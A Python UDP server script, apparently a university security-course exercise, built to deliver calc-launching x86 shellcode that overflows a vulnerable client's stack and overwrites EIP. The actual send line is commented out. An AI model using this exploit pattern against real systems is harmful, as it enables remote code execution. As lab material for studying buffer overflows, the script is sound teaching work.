#!/bin/env python3
# -*- coding: utf-8 -*-
# version: Python3.X
''' 软件安全与漏洞分析第四周任务, 目的是为了实现一个服务器发送 ShellCode 使得一个具有堆栈溢出漏洞的客户端执行
ShellCode, 利用的是覆盖 EIP 的方法
'''
__author__ = '__L1n__w@tch'

import socketserver

buf = b"\x33\xC0\x50\xB8\x2E\x65\x78\x65\x50\xB8\x63\x61\x6C\x63\x50\x8D\x04\x24\x50\xB9\xC7\x93\xBF\x77\xFF\xD1"
shellcode = buf


class MyUDPHandler(socketserver.BaseRequestHandler):
    """
    This class works similar to the TCP handler class, except that
    self.request consists of a pair of data and client socket, and since
    there is no connection the client address must be given explicitly
    when sending data back via sendto().
    """

    def handle(self):
        data = self.request[0].strip()
        socket = self.request[1]
        print("{} wrote:".format(self.client_address[0]))
        print(data)
        socket.sendto(data.upper(), self.client_address)
        # socket.sendto(shellcode + b"\xdd" * (64 - 26) + b"\xcc\xcc\xcc\xcc\x0C\xFD\x12\x00", self.client_address)


def main():
    HOST, PORT = "192.168.117.1", 9999
    server = socketserver.UDPServer((HOST, PORT), MyUDPHandler)
    server.serve_forever()


if __name__ == "__main__":
    main()
